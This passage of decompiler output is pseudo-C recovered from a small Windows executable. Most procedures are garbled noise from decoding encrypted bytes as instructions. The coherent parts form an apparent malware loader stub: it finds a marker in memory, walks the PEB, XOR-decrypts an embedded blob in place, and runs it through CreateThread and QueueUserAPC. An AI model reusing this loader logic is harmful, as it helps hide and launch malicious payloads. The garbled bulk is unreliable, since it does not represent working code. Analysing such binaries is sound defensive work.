        asm("xchg eax,ecx");
        asm("stc");
        asm("Unknown opcode 0x8e");
        *(ecx + eax + 731314509) :: bl;
        (save)cs;
        al :: 199;
    }
    (save)cs;
    asm("cmpsd");
L00401c65:
    cl = 94;
    asm("fldenv [edx-0xf]");
    if(eax < -1718264316) {
        *L0620C377 = al;
        >= ? 0x401cc0 : ;
        eax = eax & 1621302467;
        asm("Unknown opcode 0xc6");
        asm("sti");
        asm("adc ebp,edx");
        *ecx = *ecx - dh;
        asm("out 0xe2,eax");
        goto L00401c0b;
        *(edi - 25) = *(edi - 25) - bl;
        asm("xchg eax,esi");
        asm("enter 0xb1dd,0xa2");
        asm("in eax,0xbf");
        bl = 147;
L00401c90:
        asm("sbb [esi+0x65c784b3],eax");
        if(*edi = *edi + al) {
            goto L00401c34;
        }
        asm("salc");
        > ? L00401c6b : ;
        asm("xchg eax,ebx");
        asm("out dx,eax");
        *edi = *esi;
        edi = edi + 4;
        esi = esi + 4;
        ecx = ecx ^ *LDE00CF6F;
        asm("aad 0x83");
        al = al & 178;
        asm("Unknown opcode 0xc7");
        asm("outsd");
        asm("clc");
        edx :: *(ebx + ebp * 4 + 31);
        eax = eax ^ 1054268556;
        asm("clc");
        goto L00401c48;
        (restore)edi;
        asm("scasd");
        asm("Unknown opcode 0xc6");
        ah = 23;
        asm("xchg eax,esp");
        ecx = 687970728;
    }
    al = *esi;
    esi = esi + 1;
    asm("lock adc [edx+0xf2a9a890],ecx");
L00401cc7:
    asm("xchg eax,ebx");
    asm("Unknown opcode 0x8f");
    asm("a16 test eax,0xe8614f4");
    if(*(ebp + -2068564014) = *(ebp + -2068564014) + al) {
        goto L00401c65;
    }
    (save)cs;
    asm("xlatb");
    asm("loopne 0x401cf8");
    goto L00401cc7;
    *(edi + 107) = ah;
    ecx = ecx - 1;
    asm("Unknown opcode 0xd0");
    edx = ecx % ecx;
    (restore)edi;
    asm("Unknown opcode 0xd9");
    asm("rol dword [eax+0x681824b8],1");
    asm("out dx,al");
    if(ecx = ecx / ecx) {
        goto L00401c90;
    }
    *edi = *esi;
    edi = edi + 4;
    esi = esi + 4;
    asm("pushf");
    asm("iret");
}

/*	Procedure: 0x00401CF5 - 0x00401E7C
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401CF5()
{



    asm("o16 mov al,[ebx+0x13]");
    bl = *(esi - 81);
    asm("out 0x5,eax");
    asm("out dx,eax");
    ecx = -1763448733;
    asm("xchg eax,esp");
    ebx = -233826577;
    asm("insd");
    *L0BD165AF = al;
    asm("aas");
    if(!( *(eax + -1384943520) = *(eax + -1384943520) + ch)) {
        eax & -912636637 & 242;
        asm("a16 popf");
        edx = edx - 1;
        asm("Unknown opcode 0xc6");
        asm("jpe 0x401d4e");
        al = *esi;
        esi = esi + 1;
        ecx = esp + esi * 8 + 92;
        bl = 235;
        ecx = ecx - 1;
        eax = eax & 1237331646;
        asm("xchg ebx,[eax+0x4]");
        asm("in al,0x2c");
        (save)ecx;
        asm("scasb");
        ecx = *(ecx + -880904789);
        asm("cli");
        goto L00401db6;
        asm("in al,0x50");
        (save)eax;
        eax = L00008bc5();
        asm("iret");
        bh = 38;
        asm("xlatb");
        asm("cmc");
        (save)edi;
        asm("aas");
        esi = esi - 1;
        asm("out dx,eax");
        asm("xchg eax,esi");
        asm("daa");
        dl = 82;
        asm("%d pusha");
    }
    asm("aaa");
    *(ebp - 100) = *(ebp - 100) | esi;
    esp = esp - 1;
    asm("%c jo 0x401d74");
    *(eax + -1648567855) = *(eax + -1648567855) & ebp;
    asm("cmpsd");
    asm("les ecx,[esp+edx-0x64]");
    *(edx + 632767615) = *(edx + 632767615) >> 178;
    eax = *esi();
    asm("retf");
    asm("out dx,eax");
    ecx = ecx - 1;
    do {
        asm("outsb");
        ch = 79;
        asm("Unknown opcode 0xfe");
        asm("jecxz 0x401d9b");
        asm("pusha");
        *(esi + 111) = (frestore);
        asm("rep jl 0x401d12");
        asm("Unknown opcode 0xdf");
        asm("stc");
        asm("fnstcw [edx]");
        asm("loope 0x401da1");
    } while(*L1C651502 > dl);
    >= ? 0x401d84 : ;
    eax = -1861510385;
    asm("aas");
    eax :: -1689763563;
    dh = dh ^ *edi;
    (restore)ebx;
    bh = dh;
    asm("aaa");
    *(ecx + 1214250116) = dl;
    if(!(al = al - 85)) {
        >= ? 0x401da6 : ;
L00401db6:
        edx = -845699928;
        eax = eax + 280108843;
        asm("int3");
        asm("int3");
        (fsave)(frestore) - *(edi + edx - 19);
L00401dc3:
        *esi = *esi | dl;
        ch = ch + cl;
        (restore)edx;
        asm("scasb");
        do {
            asm("%c cld");
            if(eax = eax - ebx & -1064781762) {
                goto L00401e1e;
            }
            (restore)ebp;
            (restore)ebp;
            asm("popa");
            *(eax + 1009035402) = fs;
            ebp = ebp + 1;
            asm("arpl [eax-0x34],sp");
        } while(cl & al);
        asm("jecxz 0x401e52");
        *edx = (frestore);
        *(eax + 1943315506) = *(eax + 1943315506) & 217;
        ch = 239;
        asm("outsd");
        *(eax + 116) = *(eax + 116) ^ dh;
        asm("insb");
        asm("aam 0x87");
        asm("stc");
        eax = 1994019578;
        asm("jpo 0x401e39");
        edi = 1552713693;
    }
    esp = -667151572;
    (restore)ebp;
    asm("cmpsb");
    if(!(esi = esi + 1)) {
        (save)es;
        (save)ds;
        *(edx + -744701736) = (frestore);
        eax = eax & 1687687583;
L00401e1e:
        if(*(edi + 37) = *(edi + 37) - 1) {
            goto L00401dc3;
        }
        esi = esi + 1;
        asm("clc");
        al = 91;
        asm("adc al,0x9c");
        cl = *(ebp - 20);
        al & 224;
        asm("adc bl,ch");
        asm("cld");
        asm("stc");
        eax = L854240c6();
        asm("Unknown opcode 0xc5");
        asm("Unknown opcode 0xf6");
        edx = edx - 1;
        asm("enter 0xb3e4,0x57");
        asm("sbb al,[ebp+0xded9bcd0]");
        (save)ss;
        edx = edx + 1;
        asm("xchg eax,esi");
        asm("retf 0x99df");
        asm("adc ah,[edx+0x8f7b78c0]");
        eax = eax + *(eax - 117);
        asm("in al,0xd4");
        dl = dl ^ al;
        asm("out 0x8f,al");
        eax = eax & 1167254580;
        asm("xchg eax,ebp");
        (restore)edx;
        *(ebp + 67) = *(ebp + 67) / *(ebp + 67);
        edx = *(ebp + 67) % *(ebp + 67);
        *LEBA3B7F7 = al;
        asm("insb");
        al = *esi;
        esi = esi + 1;
        asm("Unknown opcode 0xf7");
        *(edi + 69) = bl;
        asm("lodsd");
        ebp = -620172878;
        asm("fst qword [eax+0x28]");
    }
    asm("cwde");
    asm("in al,0xc8");
    asm("retf");
}

stack space not deallocated on return
/*	Procedure: 0x00401E7D - 0x00401F11
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401E7D()
{



    cl = 160;
    *edi = *esi;
    edi = edi + 1;
    esi = esi + 1;
    *edi = *esi;
    edi = edi + 4;
    esi = esi + 4;
    asm("lodsd");
    asm("insd");
    esi = esi + 1;
    asm("%e dec ebx");
    eax = eax + 1;
    asm("xlatb");
    asm("xchg eax,ebp");
    do {
        ch = ch - *ebx;
        asm("xchg esp,[eax+edx*8+0xa30babfc]");
        asm("adc eax,0x1269475");
        (restore)esp;
        asm("fist dword [edx+0x1d]");
    } while(eax = eax - 1);
    asm("scasd");
    > ? L00401e89 : ;
    asm("daa");
    asm("fcom dword [eax+0x6]");
    asm("adc [ebx],ch");
    do {
        (save)edx;
        eax = 263351917;
        asm("insd");
        *(edx - 31) = ebp;
    } while(ebx = ebx - 1);
    asm("xlatb");
    asm("insb");
    asm("cld");
    asm("Unknown opcode 0xd9");
    ebp = edx + -1900657919;
    asm("in al,0xfc");
    *(edx + 106) = *(edx + 106) - ecx;
    (restore)eax;
    asm("sbb ecx,[ecx+0xffbac84c]");
    asm("xchg dh,ch");
    *(ecx + edi * 4 + -786738339) = *(ecx + edi * 4 + -786738339) & al;
    tword [edi+0x3fa41e51] = (frestore);
    (save)edx;
    asm("in al,dx");
    asm("xchg eax,esp");
    asm("xlatb");
    eax = *L4E95BABF;
    asm("aad 0xfa");
    al = *LC38D4857;
    asm("cwde");
    *L60292BE2 = eax;
    asm("popa");
    eax = L000000b3();
    asm("enter 0x75e9,0xff");
    asm("sbb [ebx-0xb],cl");
    dh = dh | bh;
    esp = esp - 1;
    asm("pushf");
    (fsave)(frestore) + *(ecx - 108);
    asm("hlt");
    *(esi - 1 + 2121902723) = ecx;
    (restore)es;
    bl = 71;
    asm("Unknown opcode 0x0f");
}

stack space not deallocated on return
/*	Procedure: 0x00401F12 - 0x00402104
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401F12()
{



    asm("fcomp qword [eax+esi+0x54]");
    eax = *(ebp + -1670002967)();
    *(ecx + 5) = edx;
    (restore)esp;
    asm("lahf");
    asm("xchg eax,ebp");
    *edi = eax;
    edi = edi + 4;
    *(ebp + -921587132) = *(ebp + -921587132) - 1;
    (save)ecx;
    *L38C076CF = al;
    eax = eax - 1668297677;
    (restore)edx;
    al = 68;
    asm("rcl byte [eax],cl");
    edi = edi + 1;
    asm("lds esp,[ecx+0x22]");
    asm("jpe 0x401f78");
    -2008129517 = *(edx + -78630127) * ebx;
    do {
        asm("adc [ecx-0x15],al");
        esp = esp - 1;
        *L68A6212E = *L68A6212E - ebx;
        asm("cld");
        asm("adc eax,0x532fbcfd");
        asm("Unknown opcode 0x8f");
        asm("scasd");
        asm("xchg eax,ebp");
        *(ebp + 932896053) = dh;
        eax = eax | -1838391336;
        *%ds:eax] = !( *%ds:eax]);
        asm("loopne 0x401f57");
        *edi = *esi;
        edi = edi + 1;
        esi = esi + 1;
        *(edi + 15) :: dh;
        asm("xchg eax,edi");
        asm("lahf");
        eax :: 2029081096;
        edi = 472588581;
        asm("sbb edx,[edi]");
    } while(al & 84);
    (save)esi;
    ecx = -1070146912;
    asm("lahf");
    (restore)ecx;
    if(!(bl = bl - 182)) {
        > ? L00401fa6 : ;
        bh = *(edi + 121);
        asm("%f leave");
        dh = dh ^ *ecx;
        *(ebx - 70) :: 957472995;
        asm("outsb");
        asm("aas");
        asm("int3");
        asm("outsd");
        eax = eax + 190214506;
        asm("fcomp dword [eax]");
        asm("xchg ebx,[edi]");
        if(*(esi + 114) = *(esi + 114) & bh) {
            goto L00402025;
        }
        *edi = eax;
        edi = edi + 4;
        -73 = edx * ebp;
        *(edi + -62180317) = *(edi + -62180317) + cl;
    }
    asm("hlt");
    asm("out 0xd1,al");
    asm("stc");
    asm("xchg eax,edi");
    asm("xchg eax,edx");
    asm("fdivr qword [esi+0xf8b8d28c]");
    (save)eax;
    asm("adc ebp,ebx");
    asm("sbb [eax-0x4a],ebp");
    asm("sbb eax,0x3e07a575");
    asm("wait");
    asm("cmc");
    *(ebp + 70) = cl;
    al & 60;
    (restore)edi;
    eax = eax ^ -1331772168;
    asm("retf");
    eax = eax - -849221704;
    asm("out 0xbf,eax");
    eax = L235353cd();
    do {
        (save)-552053900;
        (save)edi;
        asm("clc");
        asm("Unknown opcode 0x0f");
        asm("cdq");
        ch = 169;
        (save)esi;
        *edi = al;
        edi = edi + 1;
        (save)-1196319009;
        asm("loopne 0x401f9a");
        *edi = eax;
        edi = edi + 4;
        edi = 1173963861;
        asm("loop 0x401fa4");
        esp = esp + edx;
        al = *esi;
    } while(esi = esi + 1);
    cl = 157;
    (save)ebx;
    asm("pusha");
    asm("cmpsd");
    eax = eax | 1869783332;
L00402016:
    asm("scasb");
    esi = esi + 1;
    ah = al - 96 ^ *(ebp + -1454541789);
L00402025:
    asm("das");
    return;
    asm("int3");
    asm("Unknown opcode 0xc7");
    if(edx = edx + *%es:edi+0xc82f84b6]) {
        goto L00402016;
    }
    < ? L00402096 : ;
    *ebx = eax;
    al = *esi;
    esi = esi + 1;
    asm("sbb cl,cl");
    *(eax + edx * 4 - 112) = *(eax + edx * 4 - 112) | dh;
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
    return;
    (save)ebp;
    ebp = esp;
    esp = esp - 68;
    (save)ebx;
    (save)esi;
    (save)edi;
    edi = 0x40157d;
    ecx = -1873063024;
    eax = -1873260400;
    goto L00402066;
L00402065:
    edi = edi + 1;
L00402066:
    if(*edi != eax || *(edi + 4) != ecx) {
        goto L00402065;
    }
    edi = edi + 8;
    eax = *( *%fs:0x30] + 12);
    esi = *(eax + 28);
    asm("lodsd");
    esi = *(eax + 8);
    (save)-735774209;
    ebx = __imp__lstrcpyA;
    (save)L00401113();
    *ebx();
    eax = *ebx(ebp - 68, L00401113(), 59021819, ebp - 36);
    esi = 0;
    ecx = -1869574000;
    goto L004020f5;
L004020b7:
    dl = *(ebp + esi - 36);
    al = *edi;
    ebx = 3303;
L004020c2:
    al = al ^ dl;
    if(ebx = ebx - 1) {
        goto L004020c2;
    }
    esi = esi + 1;
    *edi = al;
    edi = edi + 1;
    if(esi >= 14) {
        eax = 0;
        esi = 0;
        *(ebp - 4) = 0;
L004020d7:
        edx = *(ebp - 4);
        bl = *(ebp + eax - 68);
        *(ebp + edx - 36) = *(ebp + edx - 36) + bl;
        eax = eax + 1;
        if(eax >= 11) {
            eax = 0;
        }
        *(ebp - 4) = *(ebp - 4) + 1;
        if(*(ebp - 4) < 14) {
            goto L004020d7;
        }
    }
L004020f5:
    if(*edi != ecx || *(edi + 4) != ecx) {
        goto L004020b7;
    }
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    (restore)ebp;
}

/*	Procedure: 0x00402105 - 0x00402113
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00402105()
{



    while(1) {
        (save)1;
        (save)2123;
        *__imp__SleepEx();
    }
    goto L00402106;
}

stack space not deallocated on return
/*	Procedure: 0x00402114 - 0x00402166
 *	Argument size: 4112
 *	Local size: 0
 *	Save regs size: 16
 */

__entry_point__()
{
	/* unknown */ void  ebx;
	/* unknown */ void  ebp;
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    ebp = 0;
    (save)0;
    (save)0;
    (save)0;
    (save)0x402105;
    (save)0;
    (save)0;
    edi = __imp__QueueUserAPC;
    (save)ebp;
    esi = *__imp__CreateThread();
    (save)esi;
    (save)0x40204b;
    *__imp__QueueUserAPC();
    *__imp__SleepEx();
    *edi();
    *__imp__CloseHandle();
    *__imp__SleepEx(-1, 1, esi, 0x40157d, esi, ebp, 236, ebp);
    return(0);
}

/*	Procedure: 0x00402168 - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00402168()
{



}

/* address  size  */
/* 0x00402114       0 */ /* unknown */ void 	__entry_point__;
/* 0x00403000       0 */ /* unknown */ void 	__imp__lstrlenA;
/* 0x00403004       0 */ /* unknown */ void 	__imp__SleepEx;
/* 0x00403008       0 */ /* unknown */ void 	__imp__Sleep;
/* 0x0040300c       0 */ /* unknown */ void 	__imp__QueueUserAPC;
/* 0x00403010       0 */ /* unknown */ void 	__imp__GetVersionExA;
/* 0x00403014       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x00403018       0 */ /* unknown */ void 	__imp__CreateThread;
/* 0x0040301c       0 */ /* unknown */ void 	__imp__lstrcpyA;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
